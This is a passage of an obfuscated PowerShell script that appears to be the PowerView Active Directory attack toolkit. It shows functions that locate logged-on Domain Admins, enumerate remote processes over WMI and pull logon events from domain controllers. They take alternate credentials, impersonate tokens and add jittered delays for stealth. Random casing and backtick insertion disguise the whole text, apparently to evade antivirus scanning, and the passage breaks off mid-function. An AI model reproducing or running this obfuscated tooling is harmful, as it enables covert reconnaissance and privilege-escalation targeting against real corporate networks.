    PROCESS {
        
        if (${pSBO`UndPa`RaM`E`TErs}['Delay'] -or ${PS`BoUn`dPArAM`E`TERs}['StopOnSuccess']) {

            WRitE-V`eRB`OsE "[Find-DomainUserLocation] Total number of hosts: $($TargetComputers.count)"
            wRIte-VE`R`B`osE "[Find-DomainUserLocation] Delay: $Delay, Jitter: $Jitter"
            ${co`UN`TEr} = 0
            ${r`AnD`No} = nE`w-oB`Je`ct Syste`M.ra`NDOm

            ForEach (${TARGE`TcOmPUT`eR} in ${ta`Rg`Etc`oMPU`TeRS}) {
                ${CO`UN`TEr} = ${cO`UN`TEr} + 1

                
                STARt`-`sleEp -Seconds ${R`ANDnO}.Next((1-${j`It`TEr})*${d`e`LaY}, (1+${JiT`TeR})*${DEl`AY})

                Wr`ITe-vE`Rbose "[Find-DomainUserLocation] Enumerating server $Computer ($Counter of $($TargetComputers.Count))"
                I`NVoke-c`om`MaNd -ScriptBlock ${h`osT`ENUMbL`Ock} -ArgumentList ${Tar`GEt`cOMP`UTeR}, ${TaR`g`etUsERs}, ${C`URRe`NTUser}, ${sTE`A`LTh}, ${LOgO`NT`o`keN}

                if (${RE`s`ULT} -and ${ST`OpOnSu`c`CESs}) {
                    wRITE-`Ve`R`B`osE "[Find-DomainUserLocation] Target user found, returning early"
                    return
                }
            }
        }
        else {
            W`RIte-VE`RboSe "[Find-DomainUserLocation] Using threading with threads: $Threads"
            wr`i`TE-VEr`Bose "[Find-DomainUserLocation] TargetComputers length: $($TargetComputers.Length)"

            
            ${sC`RIpt`P`ARAMS} = @{
                'TargetUsers' = ${TARG`ET`US`erS}
                'CurrentUser' = ${CurR`eN`TusER}
                'Stealth' = ${St`EALth}
                'TokenHandle' = ${lO`GOnt`o`ken}
            }

            
            n`e`w-ThRe`AdedfuNC`T`iOn -ComputerName ${tA`RgEt`Co`MPu`TERS} -ScriptBlock ${Hos`TEnU`mBLo`Ck} -ScriptParameters ${sC`R`IPt`P`ArAMs} -Threads ${tHr`e`Ads}
        }
    }

    END {
        if (${LogO`Nt`oken}) {
            iNVo`KE-ReV`e`Rttos`elf -TokenHandle ${Lo`G`onto`Ken}
        }
    }
}


function fI`ND-do`MA`i`NProce`Ss {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUsePSCredentialType', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingPlainTextForPassword', '')]
    [OutputType('PowerView.UserProcess')]
    [CmdletBinding(DefaultParameterSetName = 'None')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = ${t`RUE}, ValueFromPipelineByPropertyName = ${t`RUe})]
        [Alias('DNSHostName')]
        [String[]]
        ${co`mPUT`E`RNAme},

        [ValidateNotNullOrEmpty()]
        [String]
        ${doM`AIN},

        [ValidateNotNullOrEmpty()]
        [String]
        ${c`OM`pUTerdO`main},

        [ValidateNotNullOrEmpty()]
        [String]
        ${c`ompUTER`ldAp`FilT`ER},

        [ValidateNotNullOrEmpty()]
        [String]
        ${COMP`UteRsEAr`CH`Ba`sE},

        [Alias('Unconstrained')]
        [Switch]
        ${COmputerU`N`cONs`Tr`A`In`eD},

        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        ${comPuTE`R`opERAT`iNGSys`TEm},

        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        ${COm`PUTe`R`SErVicEP`ACK},

        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        ${c`OMPU`TEr`SIT`ena`ME},

        [Parameter(ParameterSetName = 'TargetProcess')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${PRO`c`EssNAME},

        [Parameter(ParameterSetName = 'TargetUser')]
        [Parameter(ParameterSetName = 'UserIdentity')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${U`ser`idENTiTy},

        [Parameter(ParameterSetName = 'TargetUser')]
        [ValidateNotNullOrEmpty()]
        [String]
        ${Us`eRDo`maiN},

        [Parameter(ParameterSetName = 'TargetUser')]
        [ValidateNotNullOrEmpty()]
        [String]
        ${u`s`ERLDap`FiLt`ER},

        [Parameter(ParameterSetName = 'TargetUser')]
        [ValidateNotNullOrEmpty()]
        [String]
        ${us`eRsEA`RChBA`SE},

        [ValidateNotNullOrEmpty()]
        [Alias('GroupName', 'Group')]
        [String[]]
        ${u`SeRg`ROU`PIdeNtItY} = 'Domain Admins',

        [Parameter(ParameterSetName = 'TargetUser')]
        [Alias('AdminCount')]
        [Switch]
        ${usE`RA`Dmi`Nco`UNt},

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        ${SeRV`eR},

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        ${se`Ar`CHScopE} = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        ${ResUlTPa`geSi`zE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${sErVE`RtI`mE`l`iMit},

        [Switch]
        ${T`oMBs`TonE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${c`ReDe`NtiAl} = [Management.Automation.PSCredential]::Empty,

        [Switch]
        ${StO`P`Ons`UcCeSS},

        [ValidateRange(1, 10000)]
        [Int]
        ${D`eLAY} = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        ${J`Itt`eR} = .3,

        [Int]
        [ValidateRange(1, 100)]
        ${th`R`eAds} = 20
    )

    BEGIN {
        ${COmPu`TerSe`ARCH`ErAR`g`UmenTS} = @{
            'Properties' = 'dnshostname'
        }
        if (${Ps`BO`UN`dP`Ar`AmEtERs}['Domain']) { ${COmp`UtER`S`eArC`hera`Rgum`ENtS}['Domain'] = ${dOMA`IN} }
        if (${P`sbo`UNdPA`R`AME`TeRs}['ComputerDomain']) { ${COmpU`T`eR`SEA`R`Ch`Era`RguMENTs}['Domain'] = ${COmpu`TEr`dOMA`In} }
        if (${psboUN`d`PaRA`me`T`ERs}['ComputerLDAPFilter']) { ${co`m`puterS`EAr`CHerAR`G`UmenTs}['LDAPFilter'] = ${CoMPu`TER`LdApF`i`lter} }
        if (${PSBoU`NDPARaM`Et`eRs}['ComputerSearchBase']) { ${co`MPUtE`R`sEaRChErARg`UM`eN`Ts}['SearchBase'] = ${cOMPUT`erSea`R`c`Hba`sE} }
        if (${P`SBOU`NDPArAMet`Ers}['Unconstrained']) { ${Com`p`UTEr`seA`RC`HerArGumen`TS}['Unconstrained'] = ${Unco`NstRA`i`NED} }
        if (${p`SBOun`DP`ARaM`eters}['ComputerOperatingSystem']) { ${cOMpUTERs`eA`Rc`heR`A`R`Gu`M`eNts}['OperatingSystem'] = ${oPER`A`TiNGs`y`steM} }
        if (${PS`B`oU`NDParA`mEters}['ComputerServicePack']) { ${CoM`p`UTE`RSEa`RcHerAr`GU`m`ENts}['ServicePack'] = ${s`eRviCEpA`Ck} }
        if (${PSbOUNdPARaM`e`TE`RS}['ComputerSiteName']) { ${COMpU`TE`R`S`e`ArC`HeraRGUMeNts}['SiteName'] = ${S`IteNamE} }
        if (${P`SBOU`N`dparaMETe`RS}['Server']) { ${cO`mP`UtE`RS`eArcheR`ARgumEnTS}['Server'] = ${sERV`ER} }
        if (${p`S`BOun`DPARa`MeTe`RS}['SearchScope']) { ${c`ompUTErsEaRchEr`A`RG`UmEnTs}['SearchScope'] = ${SEaR`C`hScOPe} }
        if (${PSb`OU`ND`par`AMEtE`Rs}['ResultPageSize']) { ${c`OmpuTeRSEa`RcHerar`gUm`Ents}['ResultPageSize'] = ${R`esUl`Tp`AgeSi`Ze} }
        if (${PSB`OuNd`p`AR`AMetErs}['ServerTimeLimit']) { ${ComPU`TERSe`ARc`heraRGu`M`ENTS}['ServerTimeLimit'] = ${S`erVerT`ImEL`i`mIt} }
        if (${p`SBO`U`NDparaMEte`Rs}['Tombstone']) { ${cOM`p`UtErseAr`CheRarGuMEN`TS}['Tombstone'] = ${TO`M`BstONe} }
        if (${psBOuNd`PaR`AmETe`Rs}['Credential']) { ${C`OMP`U`TeRSe`ArcHERA`Rg`UMENts}['Credential'] = ${CreDeNt`i`AL} }

        ${uS`Ers`EArCHe`RA`RGUmENTS} = @{
            'Properties' = 'samaccountname'
        }
        if (${PSBouNDPA`RAM`e`T`Ers}['UserIdentity']) { ${Use`RSEA`RcHER`ArG`UMEn`Ts}['Identity'] = ${us`ERiDE`N`T`ITy} }
        if (${PS`Bo`UnD`pArAME`TerS}['Domain']) { ${U`sE`RSEa`R`c`heRar`GUMeNtS}['Domain'] = ${d`Oma`iN} }
        if (${PsbOuNd`P`ARA`meTE`Rs}['UserDomain']) { ${uS`ErSEA`Rc`HERARgum`enTs}['Domain'] = ${USER`D`O`maiN} }
        if (${p`sBou`NDPaR`Am`etErS}['UserLDAPFilter']) { ${useRSe`ARCHE`RAR`GUMeNtS}['LDAPFilter'] = ${Us`ErlDapf`I`Lt`eR} }
        if (${psboU`N`DPaR`AmeT`eRS}['UserSearchBase']) { ${USErsE`A`RcherARgU`m`eNTS}['SearchBase'] = ${U`SeRsE`A`RC`hbase} }
        if (${p`sBoUndpaRA`m`e`TerS}['UserAdminCount']) { ${Use`RSEaRc`HE`Rarg`UmE`Nts}['AdminCount'] = ${US`ErADm`iN`CO`UNT} }
        if (${PSBo`Un`dPaR`AM`EtERs}['Server']) { ${US`ersea`RCheR`Arg`U`mEntS}['Server'] = ${s`erV`er} }
        if (${PsBOuN`DPARam`e`TeRs}['SearchScope']) { ${UsErS`eaR`c`herArG`Ume`NTs}['SearchScope'] = ${sE`ARchS`C`oPE} }
        if (${PS`BouN`d`pAR`A`MEtErS}['ResultPageSize']) { ${U`seRse`ARC`HeR`Ar`gumEN`Ts}['ResultPageSize'] = ${r`E`SULtpA`GEsiZe} }
        if (${PS`B`oU`NdpAramETERS}['ServerTimeLimit']) { ${U`SERseArCHERA`RG`UmeN`TS}['ServerTimeLimit'] = ${S`e`RVerTiMElim`It} }
        if (${Psb`OUnDpa`R`A`Met`ErS}['Tombstone']) { ${USeRS`EaR`c`h`e`RaRGum`ents}['Tombstone'] = ${TO`mb`StonE} }
        if (${psB`o`U`N`Dpa`RaMEtErS}['Credential']) { ${UsErS`EArc`HerAR`gUM`E`NTs}['Credential'] = ${C`RedEnt`I`AL} }


        
        if (${pSb`OundP`ArAMET`ers}['ComputerName']) {
            ${Tar`g`etCOMpUTe`RS} = ${Co`mpUtErN`Ame}
        }
        else {
            W`RiTe-`V`eRboSe '[Find-DomainProcess] Querying computers in the domain'
            ${TA`RgeTcOmp`UTers} = gE`T-doMaiNCOm`p`UTEr @ComputerSearcherArguments | s`el`ECT-OBJEcT -ExpandProperty dNsh`O`sTN`AMe
        }
        WritE-`VE`RbosE "[Find-DomainProcess] TargetComputers length: $($TargetComputers.Length)"
        if (${taRgEtComP`Ute`RS}.Length -eq 0) {
            throw '[Find-DomainProcess] No hosts found to enumerate'
        }

        
        if (${ps`BOuNdpa`RaMeT`eRS}['ProcessName']) {
            ${tA`RgEt`PR`OceS`snaMe} = @()
            ForEach (${T} in ${PROC`EsS`Na`Me}) {
                ${t`ArgeTP`R`oCESs`NAMe} += ${T}.Split(',')
            }
            if (${TAr`gETpro`Ces`sn`Ame} -isnot [System.Array]) {
                ${taRG`EtP`R`ocEsSNa`Me} = [String[]] @(${T`ArGetpROC`Es`snA`ME})
            }
        }
        elseif (${PSbOunDpa`R`AMetE`Rs}['UserIdentity'] -or ${PSb`ou`NDPaRaM`E`TeRs}['UserLDAPFilter'] -or ${PSbOu`N`D`PAr`AmeteRs}['UserSearchBase'] -or ${pSb`O`U`NDpaRam`Et`ERS}['UserAdminCount'] -or ${p`sBoUnd`PaRAmE`TERs}['UserAllowDelegation']) {
            ${TA`R`gEt`UserS} = get-`dOM`AINUser @UserSearcherArguments | sElEc`T-`obj`ECt -ExpandProperty Sa`maCCOUn`TNA`mE
        }
        else {
            ${GroUPSearch`eRaRG`U`M`ENts} = @{
                'Identity' = ${uS`Ergro`UPID`entI`TY}
                'Recurse' = ${t`RuE}
            }
            if (${P`S`BOUn`Dp`ARaMEtERs}['UserDomain']) { ${GROU`PSEARC`h`e`RaRgu`MenTs}['Domain'] = ${uSerd`o`m`AIN} }
            if (${psBO`UN`d`ParaMeTers}['UserSearchBase']) { ${G`Rou`PsEar`Ch`ErArGUMEN`TS}['SearchBase'] = ${UseRs`eAR`cH`BaSe} }
            if (${pSb`OUNDPaRAME`T`E`RS}['Server']) { ${G`RoupSeaRch`ERA`RgU`MENTS}['Server'] = ${SE`R`Ver} }
            if (${P`SbOU`ND`p`Aram`eteRS}['SearchScope']) { ${GrouPSEA`RchE`RaRgU`m`eNTS}['SearchScope'] = ${sEar`ChSC`O`Pe} }
            if (${psBO`Und`PARa`mE`TE`RS}['ResultPageSize']) { ${GR`ouPS`earC`H`erArgumEnTs}['ResultPageSize'] = ${Res`U`LT`PAgESIze} }
            if (${PSB`OUNDPA`RAM`Et`e`Rs}['ServerTimeLimit']) { ${grOU`Ps`eaRChERaR`g`UM`E`NtS}['ServerTimeLimit'] = ${seR`VERtimel`iMit} }
            if (${pS`BOUndP`ArA`Me`TErs}['Tombstone']) { ${GRouP`sEaRcHEra`Rgu`M`En`TS}['Tombstone'] = ${tO`mbs`TONE} }
            if (${pSbOu`N`D`ParaMEtErs}['Credential']) { ${Gr`oupsE`A`R`CH`ErArGume`Nts}['Credential'] = ${CRE`DE`NtIAl} }
            ${grO`Up`sE`ARCH`ErArgUME`N`Ts}
            ${T`ARgE`Tus`eRS} = gET`-`DO`mAIn`gro`Up`MembEr @GroupSearcherArguments | SEl`ect`-obJ`ECt -ExpandProperty meMbe`R`NAMe
        }

        
        ${HOS`T`enu`mBlocK} = {
            Param(${CoMpu`T`E`RNA`mE}, ${pROC`ESSN`A`ME}, ${taRGetu`S`e`RS}, ${crEdE`NT`i`Al})

            ForEach (${taRG`ETCom`pU`Ter} in ${c`oM`PuTE`RnaME}) {
                ${U`P} = teSt-Co`NNE`C`Tion -Count 1 -Quiet -ComputerName ${t`ARgEtC`OM`pu`TER}
                if (${u`p}) {
                    
                    
                    if (${cre`DE`NtI`AL}) {
                        ${p`R`OcEsses} = g`et-WmIpRo`C`eSS -Credential ${CReDENt`I`Al} -ComputerName ${TaRGet`c`O`mPu`TER} -ErrorAction SileNt`lYCO`NTIN`UE
                    }
                    else {
                        ${P`RoC`eSSeS} = g`eT-wMIp`RoCEsS -ComputerName ${tARG`E`T`comPUtEr} -ErrorAction silEntlY`C`onTInUe
                    }
                    ForEach (${p`R`oCeSS} in ${PRo`Ce`ssES}) {
                        
                        if (${PROc`eS`Sn`Ame}) {
                            if (${pr`oCes`sN`Ame} -Contains ${pR`OCeSs}.ProcessName) {
                                ${prO`c`esS}
                            }
                        }
                        
                        elseif (${ta`Rg`eTU`sERs} -Contains ${p`RO`Cess}.User) {
                            ${Pro`c`Ess}
                        }
                    }
                }
            }
        }
    }

    PROCESS {
        
        if (${pS`BouN`Dp`A`RAm`eTerS}['Delay'] -or ${P`S`BOu`Ndp`ArAMEtErS}['StopOnSuccess']) {

            Wri`T`e-`VErBOSE "[Find-DomainProcess] Total number of hosts: $($TargetComputers.count)"
            wr`Ite-`VeRBOSe "[Find-DomainProcess] Delay: $Delay, Jitter: $Jitter"
            ${C`oUn`TeR} = 0
            ${RA`Ndno} = Ne`W-oBJ`Ect S`ySteM`.RaND`oM

            ForEach (${t`ArgET`CompU`T`Er} in ${TARg`ET`c`om`PU`Ters}) {
                ${CO`UnTeR} = ${cO`UN`Ter} + 1

                
                STa`Rt`-SL`EeP -Seconds ${RA`N`dno}.Next((1-${ji`T`Ter})*${De`LaY}, (1+${JI`TTer})*${DEl`Ay})

                Write-VerB`O`se "[Find-DomainProcess] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count))"
                ${rE`SUlt} = IN`V`ok`E-CommA`ND -ScriptBlock ${h`oS`T`e`NUmBlOCK} -ArgumentList ${Tar`Ge`TCOmp`UTER}, ${tA`RgeT`pRoceSs`NaMe}, ${tar`Ge`Tu`SErs}, ${c`Re`D`eNtiAl}
                ${Res`U`Lt}

                if (${re`SUlt} -and ${s`To`po`NsUCC`ess}) {
                    w`R`I`TE-VeRBoSE "[Find-DomainProcess] Target user found, returning early"
                    return
                }
            }
        }
        else {
            W`RIT`e-VERBose "[Find-DomainProcess] Using threading with threads: $Threads"

            
            ${S`cRi`ptp`ArAMs} = @{
                'ProcessName' = ${t`Ar`GEtp`ROces`SNAme}
                'TargetUsers' = ${TARG`EtU`SERS}
                'Credential' = ${cREd`ENT`IAl}
            }

            
            N`ew-t`H`ReA`dEdfUNCTion -ComputerName ${TArG`etComPU`TE`RS} -ScriptBlock ${hOs`Te`Nu`MblOck} -ScriptParameters ${SCri`P`TP`Ar`AmS} -Threads ${THRe`A`ds}
        }
    }
}


function FI`N`d-Do`m`AiNuSErEVE`NT {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUsePSCredentialType', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingPlainTextForPassword', '')]
    [OutputType('PowerView.LogonEvent')]
    [OutputType('PowerView.ExplicitCredentialLogon')]
    [CmdletBinding(DefaultParameterSetName = 'Domain')]
    Param(
        [Parameter(ParameterSetName = 'ComputerName', Position = 0, ValueFromPipeline = ${Tr`UE}, ValueFromPipelineByPropertyName = ${T`RuE})]
        [Alias('dnshostname', 'HostName', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${ComPUTE`Rn`A`mE},

        [Parameter(ParameterSetName = 'Domain')]
        [ValidateNotNullOrEmpty()]
        [String]
        ${dOm`A`iN},

        [ValidateNotNullOrEmpty()]
        [Hashtable]
        ${f`Il`TER},

        [Parameter(ValueFromPipelineByPropertyName = ${tR`Ue})]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        ${StA`R`TtIme} = [DateTime]::Now.AddDays(-1),

        [Parameter(ValueFromPipelineByPropertyName = ${t`Rue})]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        ${END`T`IMe} = [DateTime]::Now,

        [ValidateRange(1, 1000000)]
        [Int]
        ${max`E`VeNtS} = 5000,

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${UsER`iDeN`TI`Ty},

        [ValidateNotNullOrEmpty()]
        [String]
        ${US`ERD`o`mAIN},

        [ValidateNotNullOrEmpty()]
        [String]
        ${uSER`lda`P`FIlT`eR},

        [ValidateNotNullOrEmpty()]
        [String]
        ${Us`erSear`ChBAsE},

        [ValidateNotNullOrEmpty()]
        [Alias('GroupName', 'Group')]
        [String[]]
        ${USERgRO`UPid`E`NTiTY} = 'Domain Admins',

        [Alias('AdminCount')]
        [Switch]
        ${use`R`AdmIncou`NT},

        [Switch]
        ${cheCK`A`Cc`ESs},

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        ${s`Erv`eR},

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        ${SE`AR`ChSc`OpE} = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        ${reSU`LTPA`g`eSi`zE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${SeRvErt`I`ME`LimIt},

        [Switch]
        ${To`Mbst`oNe},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CrEDEN`Ti`AL} = [Management.Automation.PSCredential]::Empty,

        [Switch]
        ${sTo`PoNsu`c`cess},

        [ValidateRange(1, 10000)]
        [Int]
        ${DEl`AY} = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        ${jiTT`er} = .3,

        [Int]
        [ValidateRange(1, 100)]
        ${th`REA`ds} = 20
    )

    BEGIN {
        ${uSer`s`eaRcheRa`RGUM`entS} = @{
            'Properties' = 'samaccountname'
        }
        if (${ps`BoundPARAm`Et`e`Rs}['UserIdentity']) { ${U`SERS`E`ArcheRAr`GumEn`TS}['Identity'] = ${use`RIDEN`Ti`TY} }
        if (${pS`BO`UNdPa`Rame`TERs}['UserDomain']) { ${uSERSe`Ar`CHER`A`Rg`UMe`NTS}['Domain'] = ${uSe`RDOM`A`In} }
        if (${pS`BoundP`AraM`eTERS}['UserLDAPFilter']) { ${u`s`eRsearCHERa`RGUM`eNts}['LDAPFilter'] = ${USER`l`d`APfIlTEr} }
        if (${p`sboUnDp`ARaM`Et`eRS}['UserSearchBase']) { ${USERSEa`R`CHE`RArgu`M`enTs}['SearchBase'] = ${uS`ErseArc`Hb`ASE} }
        if (${pS`BoUn`dpARamEt`E`Rs}['UserAdminCount']) { ${U`s`ERseA`R`CheRAr`GuM`eNTS}['AdminCount'] = ${usErADmInC`O`U`NT} }
        if (${PS`BouNDp`A`RAMEte`Rs}['Server']) { ${U`SerSEaRCh`eraRgUM`EN`TS}['Server'] = ${S`E`RVER} }
        if (${P`SbOUndparA`meT`ers}['SearchScope']) { ${UsE`RSEARcH`ER`Arg`U`m`EnTs}['SearchScope'] = ${seaR`cH`sCoPe} }
        if (${pSBo`UndpAR`AMeT`Ers}['ResultPageSize']) { ${U`SeRS`EARcher`AR`GUmE`NTs}['ResultPageSize'] = ${Re`sULt`p`AGesIZE} }
        if (${Ps`BoUN`d`p`ARam`ETers}['ServerTimeLimit']) { ${U`sE`RSea`RCHEraRgUM`e`N`Ts}['ServerTimeLimit'] = ${serVeRtIME`LI`m`IT} }
        if (${pSB`ouNDP`ARaME`TerS}['Tombstone']) { ${us`ErS`e`Ar`chEra`RgumEn`TS}['Tombstone'] = ${TO`M`Bst`oNe} }
        if (${p`s`BOUnDPar`A`mETErS}['Credential']) { ${u`SeRs`eA`R`chErargu`men`TS}['Credential'] = ${CreDe`Nt`Ial} }

        if (${pS`BO`Un`Dp`A`RaMeTeRs}['UserIdentity'] -or ${pS`Bo`U`N`DParAmeteRS}['UserLDAPFilter'] -or ${P`S`BouNDpAR`AMET`E`RS}['UserSearchBase'] -or ${Psb`O`Und`pAr`AmeTeRs}['UserAdminCount']) {
            ${T`Ar`GetUsE`Rs} = geT`-dom`AI`NUS`ER @UserSearcherArguments | seL`eCT`-Ob`JECT -ExpandProperty SAmACC`o`UNtNamE
        }
        elseif (${P`s`BO`UndParA`MeT`eRS}['UserGroupIdentity'] -or (-not ${p`SbOuNd`P`AR`AmEtErS}['Filter'])) {
            
            ${gR`OuPSe`A`RCHe`RarGU`M`ENTs} = @{
                'Identity' = ${UsErgROu`pId`EntI`Ty}
                'Recurse' = ${t`RuE}
            }
            wRIt`E-vE`RboSe "UserGroupIdentity: $UserGroupIdentity"
            if (${pSB`O`UNdP`ArAmE`TERS}['UserDomain']) { ${gr`oupS`eA`RCHEr`ARGuMeNts}['Domain'] = ${usE`RDom`AIN} }
            if (${psboUndP`ARa`m`e`TERs}['UserSearchBase']) { ${grO`U`pSe`ARcHeRA`RguMEnTS}['SearchBase'] = ${U`seR`S`eARchbASe} }
            if (${PsBOun`dP`ARA`m`ETeRS}['Server']) { ${G`RoUp`sEa`RChERaR`g`UMeNTS}['Server'] = ${SeRv`er} }
            if (${PsBOun`dpara`metE`RS}['SearchScope']) { ${g`RoUPS`EaR`C`hE`RARguMEn`TS}['SearchScope'] = ${SeaRC`H`SCo`pE} }
            if (${pSBou`ND`paR`AMET`ers}['ResultPageSize']) { ${G`ROU`psE`ARcHERaRGum`enTs}['ResultPageSize'] = ${res`UL`TPA`gEsiZe} }
            if (${P`SBOUn`dPAR`AMeters}['ServerTimeLimit']) { ${GrOUP`Se`A`RchERAR`gumENTs}['ServerTimeLimit'] = ${sER`VE`R`TimEl`imit} }
            if (${P`SbounDPa`Ra`m`eTERS}['Tombstone']) { ${GROU`p`SeaRcH`E`Rar`GUmENTS}['Tombstone'] = ${T`oM`BS`ToNe} }
            if (${Psb`oUnDpar`A`meT`eRs}['Credential']) { ${Gr`OUPsEarcH`erA`R`gUM`EntS}['Credential'] = ${cRe`De`Nt`IAL} }
            ${t`A`R`GeTUseRS} = gEt-doMAINGr`OUpM`Em`B`eR @GroupSearcherArguments | sElecT-O`B`ject -ExpandProperty meM`B`ERn`AmE
        }

        
        if (${psBouNDp`A`RAM`eTe`Rs}['ComputerName']) {
            ${T`ARg`etCOm`pUTErS} = ${co`MPU`TErNA`mE}
        }
        else {
            
            ${dCS`Ear`C`HeRARG`U`menTs} = @{
                'LDAP' = ${Tr`Ue}
            }
            if (${pSbo`UNdParA`ME`Te`RS}['Domain']) { ${Dc`sE`A`RCHeR`A`RGUMeNTS}['Domain'] = ${DOm`A`In} }
            if (${psbouNDPAr`A`m`ETerS}['Server']) { ${DcsEARC`hE`Rar`G`UME`Nts}['Server'] = ${SER`VeR} }
            if (${ps`BOuN`dp`A`RameTErS}['Credential']) { ${DCs`Ea`RcHeRARg`Um`ents}['Credential'] = ${cr`EDeNT`Ial} }
            WrIT`E`-V`E`RBOse "[Find-DomainUserEvent] Querying for domain controllers in domain: $Domain"
            ${Tar`G`Etc`o`MPUtErs} = g`ET-`DoM`AINC`OnTrollER @DCSearcherArguments | seLeCt`-O`BjeCt -ExpandProperty D`NsHOS`T`NAmE
        }
        if (${Targe`TcOMpu`T`ERs} -and (${T`Arge`TC`oMPUters} -isnot [System.Array])) {
            ${T`Arge`T`cOMputErS} = @(,${tArg`ET`cOmP`U`TeRs})
        }
        wriT`e-veRbo`Se "[Find-DomainUserEvent] TargetComputers length: $($TargetComputers.Length)"
        WrI`Te-V`E`Rbose "[Find-DomainUserEvent] TargetComputers $TargetComputers"
        if (${T`ARGetCOM`PU`Te`RS}.Length -eq 0) {
            throw '[Find-DomainUserEvent] No hosts found to enumerate'
        }

        
        ${H`oSteN`U`mBl`ocK} = {
            Param(${COMp`UTEr`Na`ME}, ${sTARTt`i`mE}, ${e`NdTI`mE}, ${M`AXEv`EnTS}, ${TARGE`TUSe`RS}, ${Fi`L`TEr}, ${C`Redent`i`AL})

            ForEach (${ta`Rg`eTCo`MPU`TER} in ${co`mpuTern`A`mE}) {
                ${u`p} = tES`T`-`con`NecTion -Count 1 -Quiet -ComputerName ${taRgeT`cOMp`U`TEr}
                if (${u`P}) {
                    ${dom`A`inuSe`REVeNTa`R`gS} = @{
                        'ComputerName' = ${tAR`gETcomp`U`T`eR}
                    }
                    if (${sta`R`TTIME}) { ${D`omAin`Us`ErEVenTA`Rgs}['StartTime'] = ${sT`A`RttImE} }
                    if (${e`Ndt`ImE}) { ${DOMA`I`NUs`eRe`V`ent`ArGS}['EndTime'] = ${eNDt`I`mE} }
                    if (${MAx`E`Vents}) { ${D`O`MAiNU`seReVe`NT`AR`Gs}['MaxEvents'] = ${Ma`Xev`eNts} }
                    if (${CrEdE`NT`IAl}) { ${dOMAInu`se`REv`e`Nta`Rgs}['Credential'] = ${Cr`Ede`NTIAL} }
                    if (${F`i`lteR} -or ${Ta`RGet`USe`Rs}) {
                        if (${TA`RgETU`sers}) {
                            get`-D`OmaINU`serEV`e`NT @DomainUserEventArgs | Wh`eRE-OBj`eCt {${TaRGE`T`U`SErs} -contains ${_}.TargetUserName}
                        }
                        else {
                            ${Ope`Ra`ToR} = 'or'
                            ${fil`TeR}.Keys | f`OrEa`Ch-o`BJE`Ct {
                                if ((${_} -eq 'Op') -or (${_} -eq 'Operator') -or (${_} -eq 'Operation')) {
                                    if ((${Fi`LT`er}[${_}] -match '&') -or (${fIL`TEr}[${_}] -eq 'and')) {
                                        ${opE`RAtor} = 'and'
                                    }
                                }
                            }
                            ${ke`ys} = ${FilT`ER}.Keys | wHeR`e`-OBje`ct {(${_} -ne 'Op') -and (${_} -ne 'Operator') -and (${_} -ne 'Operation')}
                            gEt-`D`OMAInU`SEReVEnT @DomainUserEventArgs | fOrEa`cH`-ObJect {
                                if (${O`PErAt`or} -eq 'or') {
                                    ForEach (${K`eY} in ${K`eYs}) {
                                        if (${_}."$Key" -match ${fi`LT`Er}[${K`Ey}]) {
                                            ${_}
                                        }
                                    }
                                }
                                else {
                                    
                                    ForEach (${k`eY} in ${k`EYS}) {
                                        if (${_}."$Key" -notmatch ${fI`L`TEr}[${k`ey}]) {
                                            break
                                        }
                                        ${_}
                                    }
                                }
                            }
                        }
                    }
                    else {
                        Get-do`MA`iNuser`EvEnt @DomainUserEventArgs
                    }
                }
            }
        }
    }

    PROCESS {
        
        if (${pSBound`p`Ar`AmEtE`Rs}['Delay'] -or ${ps`B`O`UND`paR`AmEtERS}['StopOnSuccess']) {

            Wri`Te-v`ERbO`SE "[Find-DomainUserEvent] Total number of hosts: $($TargetComputers.count)"
            wr`ItE`-verbo`sE "[Find-DomainUserEvent] Delay: $Delay, Jitter: $Jitter"
            ${c`ou`NtER} = 0
            ${r`ANdno} = n`Ew-OB`jecT SYstem.`R`An`D`Om

            ForEach (${TARGEt`coMp`U`TEr} in ${taR`g`eTCoMP`UT`ERs}) {
                ${c`OUntEr} = ${cO`U`NtER} + 1

                
                s`Tart`-slEeP -Seconds ${rAN`d`NO}.Next((1-${J`I`TteR})*${dEl`Ay}, (1+${JIT`T`eR})*${DeL`AY})

                Wr`itE`-VerBo`se "[Find-DomainUserEvent] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count))"
                ${RE`S`ULT} = InVOKe`-`C`O`mManD -ScriptBlock ${Ho`S`TeNUMBLOcK} -ArgumentList ${Tar`gE`TcO`MPUtEr}, ${St`ArT`TI`me}, ${E`N`DtiME}, ${M`A`x`EvenTS}, ${TAr`gETU`SE`RS}, ${f`I`lTer}, ${Cr`ede`NTIal}
                ${REsu`Lt}

